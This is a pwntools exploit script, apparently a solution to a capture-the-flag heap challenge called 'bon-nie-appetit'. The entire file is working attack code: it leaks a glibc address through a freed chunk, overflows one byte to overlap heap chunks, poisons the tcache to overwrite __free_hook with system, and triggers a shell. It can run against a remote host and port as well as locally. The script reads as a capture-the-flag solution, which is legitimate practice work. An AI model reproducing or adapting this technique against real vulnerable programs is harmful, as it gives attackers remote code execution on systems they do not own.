from pwn import *
import pdb

context.binary = elf = ELF('bon-nie-appetit')
glibc = ELF('glibc/libc.so.6', checksec=False)

context(terminal=['tmux', 'split-window', '-h', '-p', '65'])

gs = '''
init-pwndbg
'''

def get_process():
    if len(sys.argv) == 1:
        return elf.process()

    host, port = sys.argv[1].split(':')
    return remote(host, port)

def create(p, amount: int, order: bytes):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'[*] For how many: ', str(amount).encode())
    p.sendafter(b'[*] What would you like to order: ', order)

def show(p, index:int) -> bytes:
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'[*] Number of order: ', str(index).encode())
    p.recvuntil(b' => ')
    return p.recvuntil(b'\n+=-=-=-=-=-=-=-=-=-=-=-=-=-=+\n', drop=True)

def edit(p, index:int, order:bytes):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'[*] Number of order: ', str(index).encode())
    p.sendlineafter(b'[*] New order: ', order)

def delete(p, index:int):
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b'[*] Number of order: ', str(index).encode())

def main():
    p = get_process()
    #gdb.attach(p, gdbscript=gs, aslr=False)

    create(p, 0x420, b'A')
    create(p, 0x100, b'B')
    delete(p,0)
    delete(p,1)
    create(p, 0x420, b'\xa0')
    leak = u64(show(p, 0)[:6].ljust(8, b'\0'))
    log.info(f'Leaked main_arena address: {hex(leak)}')

    glibc.address = leak - 0x3ebca0
    log.success(f'Glibc base address: {hex(glibc.address)}')
    
    delete(p, 0)
    create(p, 0x48, b"A"*0x48)
    create(p, 0x48, b"B"*0x48)
    create(p, 0x48, b"C"*0x48)

    edit(p, 0, b"A"*0x48 + p8(0x80))
    delete(p, 1)
    delete(p, 2)
    create(p, 0x70, b"Y"*0x50 + p64(glibc.sym.__free_hook))
    create(p, 0x40, b"/bin/sh\x00")
    create(p, 0x40, p64(glibc.sym.system))
    delete(p, 2)
    #pdb.set_trace()
    p.interactive()

if __name__ == '__main__':
    main()
